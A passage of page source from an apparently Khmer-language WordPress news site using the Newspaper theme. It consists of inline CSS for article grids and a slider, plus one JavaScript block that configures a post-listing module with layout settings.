            transform: none;
            -webkit-transform: none
        }

        .tdi_62,
        .tdi_62 .tdc-inner-columns {
            display: block
        }

        .tdi_62 .tdc-inner-columns {
            width: 100%
        }
    </style>
    <style>
        .td_block_template_8.widget>ul>li {
            margin-left: 0 !important
        }

        .td_block_template_8 .td-block-title {
            font-size: 20px;
            font-weight: 800;
            margin-top: 0;
            margin-bottom: 18px;
            line-height: 29px;
            position: relative;
            overflow: hidden;
            text-align: left
        }

        .td_block_template_8 .td-block-title>* {
            position: relative;
            padding-right: 20px;
            color: var(--td_text_header_color, #000)
        }

        .td_block_template_8 .td-block-title>*:before,
        .td_block_template_8 .td-block-title>*:after {
            content: '';
            display: block;
            height: 4px;
            position: absolute;
            top: 50%;
            margin-top: -2px;
            width: 2000px;
            background-color: #f5f5f5
        }

        .td_block_template_8 .td-block-title>*:before {
            left: 100%
        }

        .td_block_template_8 .td-block-title>*:after {
            right: 100%
        }

        @media (max-width:767px) {
            .td_block_template_8 .td-related-title a {
                font-size: 15px
            }
        }

        .td_block_template_8 .td-related-title a:before {
            display: none
        }

        .td_block_template_8 .td-related-title a:first-child:after {
            display: none
        }

        .td_block_template_8 .td-related-title a:last-child:after {
            left: 100%;
            right: auto
        }

        .td_block_template_8 .td-related-title .td-cur-simple-item {
            color: var(--td_theme_color, #4db2ec)
        }

        .tdi_60 .td-block-title>* {
            color: rgb(0, 0, 0) !important
        }

        .tdi_60 .td-block-title>*:before,
        .tdi_60 .td-block-title>*:after {
            background-color: #777777 !important
        }
    </style>
    <style>
        body .tdi_60 .td-block-title a,
        body .tdi_60 .td-block-title span {
            font-family: Kantumruy !important;
            font-size: 16px !important;
            line-height: 1.8 !important;
            font-weight: 400 !important
        }

        @media (max-width:767px) {

            body .tdi_60 .td-block-title a,
            body .tdi_60 .td-block-title span {
                font-size: 14px !important
            }
        }
    </style>
    <style scoped="">
        .tdi_59 {
            vertical-align: baseline
        }

        .tdi_59>.wpb_wrapper,
        .tdi_59>.wpb_wrapper>.tdc-elements {
            display: block
        }

        .tdi_59>.wpb_wrapper>.tdc-elements {
            width: 100%
        }

        .tdi_59>.wpb_wrapper>.vc_row_inner {
            width: auto
        }

        .tdi_59>.wpb_wrapper {
            width: auto;
            height: auto
        }
    </style>
    <style>
        .tdi_53 {
            margin-bottom: 15px !important
        }

        @media (max-width:767px) {
            .tdi_53 {
                margin-bottom: 30px !important
            }
        }
    </style>
    <style>
        .tdi_53 .td-image-wrap {
            padding-bottom: 55%
        }

        .tdi_53 .entry-thumb {
            background-position: center 50%
        }

        .tdi_53 .td-module-container {
            flex-direction: column;
            border-color: #eaeaea !important
        }

        .tdi_53 .td-image-container {
            display: block;
            order: 0
        }

        .ie10 .tdi_53 .td-module-meta-info,
        .ie11 .tdi_53 .td-module-meta-info {
            flex: auto
        }

        body .tdi_53 .td-favorite {
            font-size: 36px;
            box-shadow: 1px 1px 4px 0px rgba(0, 0, 0, 0.2)
        }

        .tdi_53 .td-module-meta-info {
            border-color: #eaeaea
        }

        .tdi_53 .td_module_wrap {
            width: 25%;
            float: left;
            padding-left: 15px;
            padding-right: 15px;
            padding-bottom: 10px;
            margin-bottom: 10px
        }

        .rtl .tdi_53 .td_module_wrap {
            float: right
        }

        .tdi_53 .td_block_inner {
            margin-left: -15px;
            margin-right: -15px
        }

        .tdi_53 .td-module-container:before {
            bottom: -10px;
            border-color: #eaeaea
        }

        .tdi_53 .td-post-vid-time {
            display: block
        }

        .tdi_53 .td-post-category {
            margin: 5px;
            padding: 5px 8px 3px 8px;
            border-radius: 12px;
            background-color: #bb0000;
            font-size: 10px !important;
            font-weight: 500 !important
        }

        .tdi_53 .td-author-photo .avatar {
            width: 20px;
            height: 20px;
            margin-right: 6px;
            border-radius: 50%
        }

        .tdi_53 .td-excerpt {
            display: none;
            column-count: 1;
            column-gap: 48px
        }

        .tdi_53 .td-audio-player {
            opacity: 1;
            visibility: visible;
            height: auto;
            font-size: 13px
        }

        .tdi_53 .td-read-more {
            display: none
        }

        .tdi_53 .td-author-date {
            display: none
        }

        .tdi_53 .td-post-author-name {
            display: none
        }

        .tdi_53 .td-post-date,
        .tdi_53 .td-post-author-name span {
            display: none
        }

        .tdi_53 .entry-review-stars {
            display: none
        }

        .tdi_53 .td-icon-star,
        .tdi_53 .td-icon-star-empty,
        .tdi_53 .td-icon-star-half {
            font-size: 15px
        }

        .tdi_53 .td-module-comments {
            display: none
        }

        .tdi_53 .td_module_wrap:nth-child(4n+1) {
            clear: both
        }

        .tdi_53 .td_module_wrap:nth-last-child(-n+4) {
            margin-bottom: 0;
            padding-bottom: 0
        }

        .tdi_53 .td_module_wrap:nth-last-child(-n+4) .td-module-container:before {
            display: none
        }

        .tdi_53 .td-module-title a {
            box-shadow: inset 0 0 0 0 #000
        }

        .tdi_53 .entry-title {
            font-size: 16px !important;
            line-height: 1.5 !important
        }

        html:not([class*='ie']) .tdi_53 .td-module-container:hover .entry-thumb:before {
            opacity: 0
        }

        @media (min-width:768px) {
            .tdi_53 .td-module-title a {
                transition: all 0.2s ease;
                -webkit-transition: all 0.2s ease
            }
        }

        @media (min-width:1019px) and (max-width:1140px) {
            .tdi_53 .td_module_wrap {
                padding-bottom: 10px;
                margin-bottom: 10px
            }

            .tdi_53 .td-module-container:before {
                bottom: -10px
            }

            .tdi_53 .td_module_wrap {
                clear: none !important;
                padding-bottom: 10px !important;
                margin-bottom: 10px !important
            }

            .tdi_53 .td_module_wrap:nth-child(4n+1) {
                clear: both !important
            }

            .tdi_53 .td_module_wrap:nth-last-child(-n+4) {
                margin-bottom: 0 !important;
                padding-bottom: 0 !important
            }

            .tdi_53 .td_module_wrap .td-module-container:before {
                display: block !important
            }

            .tdi_53 .td_module_wrap:nth-last-child(-n+4) .td-module-container:before {
                display: none !important
            }

            .tdi_53 .td-module-title a {
                box-shadow: inset 0 0 0 0 #000
            }

            @media (min-width:768px) {
                .tdi_53 .td-module-title a {
                    transition: all 0.2s ease;
                    -webkit-transition: all 0.2s ease
                }
            }
        }

        @media (min-width:768px) and (max-width:1018px) {
            .tdi_53 .td_module_wrap {
                padding-left: 7.5px;
                padding-right: 7.5px
            }

            .tdi_53 .td_block_inner {
                margin-left: -7.5px;
                margin-right: -7.5px
            }

            .tdi_53 .td_module_wrap {
                padding-bottom: 10px;
                margin-bottom: 10px;
                clear: none !important;
                padding-bottom: 10px !important;
                margin-bottom: 10px !important
            }

            .tdi_53 .td-module-container:before {
                bottom: -10px
            }

            .tdi_53 .td_module_wrap:nth-child(4n+1) {
                clear: both !important
            }

            .tdi_53 .td_module_wrap:nth-last-child(-n+4) {
                margin-bottom: 0 !important;
                padding-bottom: 0 !important
            }

            .tdi_53 .td_module_wrap .td-module-container:before {
                display: block !important
            }

            .tdi_53 .td_module_wrap:nth-last-child(-n+4) .td-module-container:before {
                display: none !important
            }

            .tdi_53 .td-module-title a {
                box-shadow: inset 0 0 0 0 #000
            }

            .tdi_53 .entry-title {
                font-size: 12px !important
            }

            .tdi_53 .td-post-category {
                font-size: 8px !important
            }

            @media (min-width:768px) {
                .tdi_53 .td-module-title a {
                    transition: all 0.2s ease;
                    -webkit-transition: all 0.2s ease
                }
            }
        }

        @media (max-width:767px) {
            .tdi_53 .td-image-container {
                flex: 0 0 40%;
                width: 40%
            }

            .ie10 .tdi_53 .td-image-container,
            .ie11 .tdi_53 .td-image-container {
                flex: 0 0 auto
            }

            .tdi_53 .td-module-container {
                flex-direction: row
            }

            .tdi_53 .td-image-container {
                display: block;
                order: 0
            }

            .ie10 .tdi_53 .td-module-meta-info,
            .ie11 .tdi_53 .td-module-meta-info {
                flex: 1
            }

            .tdi_53 .td-module-meta-info {
                padding: 0 0 0 15px
            }

            .tdi_53 .td_module_wrap {
                width: 100%;
                float: left;
                padding-bottom: 10px;
                margin-bottom: 10px;
                padding-bottom: 10px !important;
                margin-bottom: 10px !important
            }

            .rtl .tdi_53 .td_module_wrap {
                float: right
            }

            .tdi_53 .td-module-container:before {
                bottom: -10px
            }

            .tdi_53 .td-post-category {
                margin: 0px;
                padding: 5px 5px 3px 5px;
                border-radius: 1px;
                font-size: 8px !important
            }

            .tdi_53 .td_module_wrap:nth-last-child(1) {
                margin-bottom: 0 !important;
                padding-bottom: 0 !important
            }

            .tdi_53 .td_module_wrap .td-module-container:before {
                display: block !important
            }

            .tdi_53 .td_module_wrap:nth-last-child(1) .td-module-container:before {
                display: none !important
            }

            .tdi_53 .td-module-title a {
                box-shadow: inset 0 0 0 0 #000
            }

            .tdi_53 .entry-title {
                font-size: 15px !important
            }

            @media (min-width:768px) {
                .tdi_53 .td-module-title a {
                    transition: all 0.2s ease;
                    -webkit-transition: all 0.2s ease
                }
            }
        }
    </style>
    <script>
        var block_tdi_53 = new tdBlock();
        block_tdi_53.id = "tdi_53";
        block_tdi_53.atts = '{"hide_audio":"yes","show_btn":"none","show_audio":"","show_excerpt":"none","show_review":"none","show_com":"none","image_height":"55","f_title_font_size":"eyJhbGwiOiIxNiIsInBob25lIjoiMTUiLCJwb3J0cmFpdCI6IjEyIn0=","f_title_font_line_height":"1.5","modules_category":"image","show_cat":"","show_author":"none","show_date":"none","all_modules_space":"20","f_cat_font_size":"eyJhbGwiOiIxMCIsInBvcnRyYWl0IjoiOCIsInBob25lIjoiOCJ9","f_cat_font_weight":"500","cat_bg":"#bb0000","modules_category_padding":"eyJhbGwiOiI1cHggOHB4IDNweCA4cHgiLCJwaG9uZSI6IjVweCA1cHggM3B4IDVweCJ9","tdc_css":"eyJhbGwiOnsibWFyZ2luLWJvdHRvbSI6IjE1IiwiZGlzcGxheSI6IiJ9LCJwaG9uZSI6eyJtYXJnaW4tYm90dG9tIjoiMzAiLCJkaXNwbGF5IjoiIn0sInBob25lX21heF93aWR0aCI6NzY3fQ==","modules_category_margin":"eyJhbGwiOiI1cHgiLCJwaG9uZSI6IjAifQ==","modules_category_radius":"eyJhbGwiOjEyLCJwaG9uZSI6IjEifQ==","offset":"5","modules_on_row":"eyJhbGwiOiIyNSUiLCJwaG9uZSI6IjEwMCUifQ==","modules_gap":"eyJhbGwiOiIzMCIsInBvcnRyYWl0IjoiMTUifQ==","limit":"8","image_floated":"eyJwaG9uZSI6ImZsb2F0X2xlZnQifQ==","image_width":"eyJwaG9uZSI6IjQwIn0=","meta_padding":"eyJwaG9uZSI6IjAgMCAwIDE1cHgifQ==","block_type":"td_flex_block_1","separator":"","custom_title":"","custom_url":"","block_template_id":"","title_tag":"","mc1_tl":"","mc1_title_tag":"","mc1_el":"","post_ids":"","category_id":"","taxonomies":"","category_ids":"","in_all_terms":"","tag_slug":"","autors_id":"","installed_post_types":"","include_cf_posts":"","exclude_cf_posts":"","sort":"","linked_posts":"","favourite_only":"","open_in_new_window":"","show_modified_date":"","time_ago":"","time_ago_add_txt":"ago","time_ago_txt_pos":"","review_source":"","el_class":"","td_query_cache":"","td_query_cache_expiration":"","td_ajax_filter_type":"","td_ajax_filter_ids":"","td_filter_default_txt":"All","td_ajax_preloading":"","container_width":"","m_padding":"","modules_border_size":"","modules_border_style":"","modules_border_color":"#eaeaea","modules_border_radius":"","modules_divider":"","modules_divider_color":"#eaeaea","h_effect":"","image_size":"","image_alignment":"50","image_radius":"","hide_image":"","show_favourites":"","fav_size":"2","fav_space":"","fav_ico_color":"","fav_ico_color_h":"","fav_bg":"","fav_bg_h":"","fav_shadow_shadow_header":"","fav_shadow_shadow_title":"Shadow","fav_shadow_shadow_size":"","fav_shadow_shadow_offset_horizontal":"","fav_shadow_shadow_offset_vertical":"","fav_shadow_shadow_spread":"","fav_shadow_shadow_color":"","video_icon":"","video_popup":"yes","video_rec":"","spot_header":"","video_rec_title":"","video_rec_color":"","video_rec_disable":"","autoplay_vid":"yes","show_vid_t":"block","vid_t_margin":"","vid_t_padding":"","video_title_color":"","video_title_color_h":"","video_bg":"","video_overlay":"","vid_t_color":"","vid_t_bg_color":"","f_vid_title_font_header":"","f_vid_title_font_title":"Video pop-up article title","f_vid_title_font_settings":"","f_vid_title_font_family":"","f_vid_title_font_size":"","f_vid_title_font_line_height":"","f_vid_title_font_style":"","f_vid_title_font_weight":"","f_vid_title_font_transform":"","f_vid_title_font_spacing":"","f_vid_title_":"","f_vid_time_font_title":"Video duration text","f_vid_time_font_settings":"","f_vid_time_font_family":"","f_vid_time_font_size":"","f_vid_time_font_line_height":"","f_vid_time_font_style":"","f_vid_time_font_weight":"","f_vid_time_font_transform":"","f_vid_time_font_spacing":"","f_vid_time_":"","meta_info_align":"","meta_info_horiz":"layout-default","meta_width":"","meta_margin":"","meta_space":"","art_title":"","art_btn":"","meta_info_border_size":"","meta_info_border_style":"","meta_info_border_color":"#eaeaea","meta_info_border_radius":"","modules_cat_border":"","modules_extra_cat":"","author_photo":"","author_photo_size":"","author_photo_space":"","author_photo_radius":"","review_space":"","review_size":"2.5","review_distance":"","art_excerpt":"","excerpt_col":"1","excerpt_gap":"","excerpt_middle":"","excerpt_inline":"","art_audio":"","art_audio_size":"1.5","btn_title":"","btn_margin":"","btn_padding":"","btn_border_width":"","btn_radius":"","pag_space":"","pag_padding":"","pag_border_width":"","pag_border_radius":"","prev_tdicon":"","next_tdicon":"","pag_icons_size":"","f_header_font_header":"","f_header_font_title":"Block header","f_header_font_settings":"","f_header_font_family":"","f_header_font_size":"","f_header_font_line_height":"","f_header_font_style":"","f_header_font_weight":"","f_header_font_transform":"","f_header_font_spacing":"","f_header_":"","f_ajax_font_title":"Ajax categories","f_ajax_font_settings":"","f_ajax_font_family":"","f_ajax_font_size":"","f_ajax_font_line_height":"","f_ajax_font_style":"","f_ajax_font_weight":"","f_ajax_font_transform":"","f_ajax_font_spacing":"","f_ajax_":"","f_more_font_title":"Load more button","f_more_font_settings":"","f_more_font_family":"","f_more_font_size":"","f_more_font_line_height":"","f_more_font_style":"","f_more_font_weight":"","f_more_font_transform":"","f_more_font_spacing":"","f_more_":"","f_title_font_header":"","f_title_font_title":"Article title","f_title_font_settings":"","f_title_font_family":"","f_title_font_style":"","f_title_font_weight":"","f_title_font_transform":"","f_title_font_spacing":"","f_title_":"","f_cat_font_title":"Article category tag","f_cat_font_settings":"","f_cat_font_family":"","f_cat_font_line_height":"","f_cat_font_style":"","f_cat_font_transform":"","f_cat_font_spacing":"","f_cat_":"","f_meta_font_title":"Article meta info","f_meta_font_settings":"","f_meta_font_family":"","f_meta_font_size":"","f_meta_font_line_height":"","f_meta_font_style":"","f_meta_font_weight":"","f_meta_font_transform":"","f_meta_font_spacing":"","f_meta_":"","f_ex_font_title":"Article excerpt","f_ex_font_settings":"","f_ex_font_family":"","f_ex_font_size":"","f_ex_font_line_height":"","f_ex_font_style":"","f_ex_font_weight":"","f_ex_font_transform":"","f_ex_font_spacing":"","f_ex_":"","f_btn_font_title":"Article read more button","f_btn_font_settings":"","f_btn_font_family":"","f_btn_font_size":"","f_btn_font_line_height":"","f_btn_font_style":"","f_btn_font_weight":"","f_btn_font_transform":"","f_btn_font_spacing":"","f_btn_":"","mix_color":"","mix_type":"","fe_brightness":"1","fe_contrast":"1","fe_saturate":"1","mix_color_h":"","mix_type_h":"","fe_brightness_h":"1","fe_contrast_h":"1","fe_saturate_h":"1","m_bg":"","color_overlay":"","shadow_shadow_header":"","shadow_shadow_title":"Module Shadow","shadow_shadow_size":"","shadow_shadow_offset_horizontal":"","shadow_shadow_offset_vertical":"","shadow_shadow_spread":"","shadow_shadow_color":"","title_txt":"","title_txt_hover":"","all_underline_height":"","all_underline_color":"","cat_bg_hover":"","cat_txt":"","cat_txt_hover":"","cat_border":"","cat_border_hover":"","meta_bg":"","author_txt":"","author_txt_hover":"","date_txt":"","ex_txt":"","com_bg":"","com_txt":"","rev_txt":"","audio_btn_color":"","audio_time_color":"","audio_bar_color":"","audio_bar_curr_color":"","shadow_m_shadow_header":"","shadow_m_shadow_title":"Meta info shadow","shadow_m_shadow_size":"","shadow_m_shadow_offset_horizontal":"","shadow_m_shadow_offset_vertical":"","shadow_m_shadow_spread":"","shadow_m_shadow_color":"","btn_bg":"","btn_bg_hover":"","btn_txt":"","btn_txt_hover":"","btn_border":"","btn_border_hover":"","pag_text":"","pag_h_text":"","pag_bg":"","pag_h_bg":"","pag_border":"","pag_h_border":"","ajax_pagination":"","ajax_pagination_next_prev_swipe":"","ajax_pagination_infinite_stop":"","css":"","td_column_number":3,"header_color":"","color_preset":"","border_top":"","class":"tdi_53","tdc_css_class":"tdi_53","tdc_css_class_style":"tdi_53_rand_style"}';
        block_tdi_53.td_column_number = "3";
        block_tdi_53.block_type = "td_flex_block_1";
        block_tdi_53.post_count = "8";
        block_tdi_53.found_posts = "362";
        block_tdi_53.header_color = "";
        block_tdi_53.ajax_pagination_infinite_stop = "";
        block_tdi_53.max_num_pages = "45";
        tdBlocksArray.push(block_tdi_53);
    </script>
    <style scoped="">
        .tdi_52 {
            vertical-align: baseline
        }

        .tdi_52>.wpb_wrapper,
        .tdi_52>.wpb_wrapper>.tdc-elements {
            display: block
        }

        .tdi_52>.wpb_wrapper>.tdc-elements {
            width: 100%
        }

        .tdi_52>.wpb_wrapper>.vc_row_inner {
            width: auto
        }

        .tdi_52>.wpb_wrapper {
            width: auto;
            height: auto
        }
    </style>
    <style scoped="">
        .tdi_50,
        .tdi_50 .tdc-columns {
            min-height: 0
        }

        .tdi_50,
        .tdi_50 .tdc-columns {
            display: block
        }

        .tdi_50 .tdc-columns {
            width: 100%
        }
    </style>
    <style scoped="">
        .tdi_47 {
            vertical-align: baseline
        }

        .tdi_47>.wpb_wrapper,
        .tdi_47>.wpb_wrapper>.tdc-elements {
            display: block
        }

        .tdi_47>.wpb_wrapper>.tdc-elements {
            width: 100%
        }

        .tdi_47>.wpb_wrapper>.vc_row_inner {
            width: auto
        }

        .tdi_47>.wpb_wrapper {
            width: auto;
            height: auto
        }
    </style>
    <style>
        @media (max-width:767px) {
            .tdi_44 {
                margin-bottom: 10px !important
            }
        }
    </style>
    <style>
        .td_block_slide {
            position: relative;
            overflow: hidden;
            *zoom: 1
        }

        .td_block_slide:before,
        .td_block_slide:after {
            display: table;
            content: '';
            line-height: 0
        }

        .td_block_slide:after {
            clear: both
        }

        .td_block_slide .td_block_inner {
            position: relative
        }

        .td_block_slide .td-module-thumb,
        .td_block_slide .td-video-play-ico,
        .td_block_slide .td-slide-meta,
        .td_block_slide i {
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            user-select: none
        }

        .td_block_slide .td-module-thumb {
            margin-bottom: 0;
            z-index: -1;
            position: static
        }

        .td_block_slide .td-video-play-ico {
            width: 40px !important;
            height: 40px !important;
            font-size: 40px !important;
            border-width: 0.05em !important
        }

        .td_block_slide .td-admin-edit {
            height: auto !important
        }

        .td_block_slide .td_module_slide {
            z-index: 1;
            visibility: hidden !important
        }

        .td_block_slide .td-image-gradient:before {
            height: 100%
        }

        .td_block_slide .td-module-thumb,
        .td_block_slide .entry-thumb {
            height: 100%
        }

        .td_block_slide .entry-thumb {
            background-size: cover
        }

        .td_block_slide .td-slide-meta {
            z-index: 2;
            position: absolute;
            bottom: 10px;
            width: 100%;
            padding: 0 22px;
            color: #fff;
            left: 0;
            right: 0;
            margin: 0 auto
        }

        .td_block_slide .td-slide-meta a,
        .td_block_slide .td-slide-meta span {
            color: #fff
        }

        .td_block_slide .entry-title {
            margin: 5px 0
        }

        .td_block_slide .entry-review-stars {
            margin-right: 22px;
            top: 0
        }

        .td_block_slide .td-post-date {
            color: #fff;
            margin-left: 4px
        }

        .td_block_slide .td-post-views {
            display: inline-block;
            vertical-align: top;
            margin-right: 22px;
            line-height: 15px
        }

        .td_block_slide .td-icon-views {
            position: relative;
            line-height: 17px;
            font-size: 14px;
            margin-right: 5px;
            vertical-align: top
        }

        .td_block_slide .td-post-comments {
            position: relative;
            top: 2px;
            display: inline-block;
            vertical-align: top;
            margin-left: 10px
        }

        .td_block_slide .td-icon-comments {
            margin-right: 5px;
            font-size: 9px;
            position: relative;
            top: 1px
        }

        .td_block_slide .td-slide-nav {
            padding: 20px;
            position: absolute;
            display: block;
            height: 80px;
            margin-top: -40px;
            top: 50%;
            font-size: 38px;
            color: #fff;
            opacity: 0;
            -webkit-transition: opacity 0.4s;
            transition: opacity 0.4s
        }

        .td_block_slide .td-slide-nav-svg {
            display: inline-flex;
            align-items: center;
            justify-content: center
        }

        .td_block_slide .td-slide-nav-svg svg {
            width: 38px;
            height: auto
        }

        .td_block_slide .td-slide-nav-svg svg,
        .td_block_slide .td-slide-nav-svg svg * {
            fill: #fff
        }

        .td_block_slide .prevButton {
            left: 0
        }

        .td_block_slide .nextButton {
            right: 0
        }

        .td_block_slide .td_module_wrap:hover .entry-title a {
            color: #fff
        }

        .td-ss-main-sidebar .td_block_slide,
        .td-ss-row .td-pb-span4 .td_block_slide {
            overflow: visible
        }

        .td-theme-slider .slide-meta-cat a {
            font-family: 'Roboto', sans-serif;
            font-size: 12px;
            font-weight: 500;
            text-transform: uppercase;
            display: inline-block;
            margin: 0 0 5px 0;
            padding: 4px 7px 3px;
            line-height: 14px;
            background-color: rgba(0, 0, 0, 0.7);
            -webkit-transition: background-color 0.3s ease;
            transition: background-color 0.3s ease
        }

        .td-theme-slider:hover .td-slide-nav {
            opacity: 1;
            z-index: 1
        }

        .td-theme-slider:hover .slide-meta-cat a {
            background-color: var(--td_theme_color, #4db2ec)
        }

        @-moz-document url-prefix() {
            .td-theme-slider .slide-meta-cat a {
                padding: 3px 7px 4px
            }
        }

        .iosSlider-col-3,
        .iosSlider-col-3 .td_module_slide {
            height: 580px
        }

        .iosSlider-col-3 .entry-title {
            font-size: 48px;
            line-height: 58px
        }

        .iosSlider-col-2,
        .iosSlider-col-2 .td_module_slide {
            height: 385px
        }

        .iosSlider-col-2 .entry-title {
            font-size: 26px;
            line-height: 32px
        }

        .td_block_slide .iosSlider-col-1,
        .td_block_slide .iosSlider-col-1 .td_module_slide {
            height: 385px
        }

        .td_block_slide .iosSlider-col-1 .entry-title {
            font-size: 18px;
            line-height: 24px
        }

        .td_block_slide .td_module_slide:first-child,
        .td-js-loaded .td_block_slide .td_module_slide {
            visibility: visible !important
        }

        .tdi_44 .td-slide-meta {
            max-width: calc(100% + 44px);
            text-align: center;
            padding: 15px 40px
        }

        .tdi_44 .entry-thumb {
            background-position: center 35%
        }

        .tdi_44 .td_block_inner,
        .tdi_44 .td-theme-slider,
        .tdi_44 .td_module_slide {
            height: 420px !important
        }

        .tdi_44 .entry-title {
            margin: 10px 0px
        }

        .tdi_44 .slide-meta-cat a {
            border-radius: 12px
        }

        .tdi_44 .slide-meta-cat {
            display: inline-block
        }

        .tdi_44 .td-post-author-name {
            display: none
        }

        .tdi_44 .td-post-comments {
            display: none
        }

        .tdi_44 .td-slide-nav {
            font-size: 30px
        }

        .tdi_44 .td-slide-nav-svg svg {
            width: 30px
        }

        .tdi_44 .td-image-gradient:before {
            background: -webkit-linear-gradient(0deg, rgba(221, 51, 51, 0.8), rgba(0, 0, 0, 0) 50%, rgba(255, 255, 255, 0));
            background: linear-gradient(0deg, rgba(221, 51, 51, 0.8), rgba(0, 0, 0, 0) 50%, rgba(255, 255, 255, 0))
        }

        .tdi_44 span.slide-meta-cat a {
            background-color: #bb0000
        }

        .tdi_44 .td_module_slide:hover span.slide-meta-cat a,
        .tdi_44 .td-theme-slider:hover .slide-meta-cat a {
            background-color: #bb0000
        }

        .tdi_44 .td_module_slide .entry-title {
            font-family: Odor Mean Chey !important;
            font-size: 22px !important;
            line-height: 1.6 !important
        }

        .tdi_44 .td_module_slide .slide-meta-cat a {
            font-family: KhmerOSSiemreap !important
        }

        .tdi_44 .td_module_slide .td-module-meta-info,
        .tdi_44 .td_module_slide .td-module-comments a {
            font-family: KhmerOSSiemreap !important;
            font-weight: 500 !important;
            text-transform: uppercase !important
        }

        .tdi_44 .td-theme-slider:hover .entry-thumb:before {
            opacity: 0
        }

        @media (max-width:1018px) {
            .td_block_slide .td-video-play-ico {
                top: 12px;
                left: auto;
                right: 12px;
                -webkit-transform: none;
                transform: none
            }
        }

        @media (max-width:767px) {
            .td_block_slide .td-slide-meta {
                padding: 0 12px;
                bottom: 3px
            }
        }

        @media (max-width:767px) {
            .td-theme-slider .slide-meta-cat a {
                font-size: 10px;
                padding: 2px 5px 2px;
                margin-bottom: 0;
                line-height: 13px
            }
        }

        @media (max-width:767px) {
            .td-theme-slider .slide-meta-cat a {
                line-height: 12px
            }
        }

        @media (min-width:1019px) and (max-width:1140px) {

            .iosSlider-col-3,
            .iosSlider-col-3 .td_module_slide {
                height: 532px
            }
        }

        @media (min-width:768px) and (max-width:1018px) {

            .iosSlider-col-3,
            .iosSlider-col-3 .td_module_slide {
                height: 402px
            }
        }

        @media (max-width:767px) {

            .iosSlider-col-3,
            .iosSlider-col-3 .td_module_slide {
                height: 298px
            }
        }

        @media (max-width:500px) {

            .iosSlider-col-3,
            .iosSlider-col-3 .td_module_slide {
                height: 163px
            }
        }

        @media (min-width:1019px) and (max-width:1140px) {
            .iosSlider-col-3 .entry-title {
                font-size: 42px;
                line-height: 52px
            }
        }

        @media (min-width:768px) and (max-width:1018px) {
            .iosSlider-col-3 .entry-title {
                font-size: 34px;
                line-height: 44px
            }
        }

        @media (max-width:767px) {
            .iosSlider-col-3 .entry-title {
                font-size: 26px;
                line-height: 32px
            }
        }

        @media (max-width:500px) {
            .iosSlider-col-3 .entry-title {
                font-size: 18px;
                line-height: 24px
            }
        }

        @media (min-width:1019px) and (max-width:1140px) {

            .iosSlider-col-2,
            .iosSlider-col-2 .td_module_slide {
                height: 354px
            }
        }

        @media (min-width:768px) and (max-width:1018px) {

            .iosSlider-col-2,
            .iosSlider-col-2 .td_module_slide {
                height: 268px
            }
        }

        @media (max-width:767px) {

            .iosSlider-col-2,
            .iosSlider-col-2 .td_module_slide {
                height: 303px
            }
        }

        @media (max-width:500px) {

            .iosSlider-col-2,
            .iosSlider-col-2 .td_module_slide {
                height: 166px
            }
        }

        @media (min-width:768px) and (max-width:1018px) {
            .iosSlider-col-2 .entry-title {
                font-size: 22px;
                line-height: 28px
            }
        }

        @media (max-width:500px) {
            .iosSlider-col-2 .entry-title {
                font-size: 18px;
                line-height: 24px
            }
        }

        @media (min-width:1019px) and (max-width:1140px) {

            .td_block_slide .iosSlider-col-1,
            .td_block_slide .iosSlider-col-1 .td_module_slide {
                height: 354px
            }
        }

        @media (min-width:768px) and (max-width:1018px) {

            .td_block_slide .iosSlider-col-1,
            .td_block_slide .iosSlider-col-1 .td_module_slide {
                height: 268px
            }
        }

        @media (max-width:767px) {

            .td_block_slide .iosSlider-col-1,
            .td_block_slide .iosSlider-col-1 .td_module_slide {
                height: 303px
            }
        }

        @media (max-width:500px) {

            .td_block_slide .iosSlider-col-1,
            .td_block_slide .iosSlider-col-1 .td_module_slide {
                height: 200px
            }
        }

        @media (max-width:767px) {
            .td_block_slide .iosSlider-col-1 .entry-title {
                font-size: 26px;
                line-height: 32px
            }
        }

        @media (max-width:500px) {
            .td_block_slide .iosSlider-col-1 .entry-title {
                font-size: 18px;
                line-height: 24px
            }
        }

        @media (max-width:767px) {
            .tdi_44 .td-slide-meta {
                max-width: calc(100% + 24px)
            }
        }

        @media (min-width:1019px) and (max-width:1140px) {

            .tdi_44 .td_block_inner,
            .tdi_44 .td-theme-slider,
            .tdi_44 .td_module_slide {
                height: 385px !important
            }
        }

        @media (min-width:768px) and (max-width:1018px) {
            .tdi_44 .entry-thumb {
                background-position: center 40%
            }

            .tdi_44 .td_block_inner,
            .tdi_44 .td-theme-slider,
            .tdi_44 .td_module_slide {
                height: 365px !important
            }

            .tdi_44 .td-slide-nav {
                font-size: 38px
            }

            .tdi_44 .td-slide-nav-svg svg {
                width: 38px
            }
        }

        @media (max-width:767px) {
            .tdi_44 .entry-thumb {
                background-position: center 30%
            }

            .tdi_44 .td_block_inner,
            .tdi_44 .td-theme-slider,
            .tdi_44 .td_module_slide {
                height: 190px !important
            }

            .tdi_44 .td-post-date,
            .tdi_44 .td-post-author-name span {
                display: none
            }

            .tdi_44 .td-module-meta-info {
                display: none
            }

            .tdi_44 .td_module_slide .entry-title {
                font-size: 15px !important
            }
        }
    </style>
    <script>
        var block_tdi_44 = new tdBlock();
        block_tdi_44.id = "tdi_44";
